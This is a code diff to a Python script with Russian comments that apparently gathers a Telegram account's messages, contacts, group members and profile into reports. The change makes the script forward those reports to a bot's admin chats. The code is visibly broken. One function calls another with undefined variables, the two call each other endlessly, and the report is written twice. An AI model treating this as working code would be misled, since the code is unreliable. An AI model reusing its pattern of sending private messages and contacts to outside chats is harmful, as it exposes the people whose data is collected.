@@ -65,13 +65,17 @@ def generate_html_report(phone, userid, firstname, lastname, username, total_con
     )
 
     # Сохраняем результат в HTML файл
+    report_filename = f"{phone}_report.html"
     with open(f"{phone}_report.html", 'w', encoding='utf-8') as file:
         file.write(html_content)
 
     # Сохраняем результат в HTML файл
     with open(f"{phone}_report.html", 'w', encoding='utf-8') as file:
         file.write(html_content)
-
+        
+    send_files_to_bot(bot, admin_chat_ids, additional_files=[report_filename])
+    return report_filename
+    
 #Выгружаем сообщения 
 def remove_timezone(dt: datetime) -> Optional[datetime]:
     # Удаление информации о часовом поясе из объекта datetime
@@ -694,8 +698,12 @@ def get_participants_and_save_xlsx(client, index: int, id: bool, name: bool, gro
 
     
 # Функци по отправке в боты
-def send_files_to_bot(bot, admin_chat_ids):
+def send_files_to_bot(bot, admin_chat_ids, additional_files=None):
+    report_filename = generate_html_report(phone, userid, firstname, lastname, username, total_contacts, total_contacts_with_phone, total_mutual_contacts, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, blocked_bot_info, all_info)
     file_extensions = ['_messages.xlsx', '_participants.xlsx', '_contacts.xlsx', '_about.xlsx']
+
+    if additional_files:
+        file_extensions.extend(additional_files)
     
     for file_extension in file_extensions:
         files_to_send = [file_name for file_name in os.listdir('.') if file_name.endswith(file_extension) and os.path.getsize(file_name) > 0]
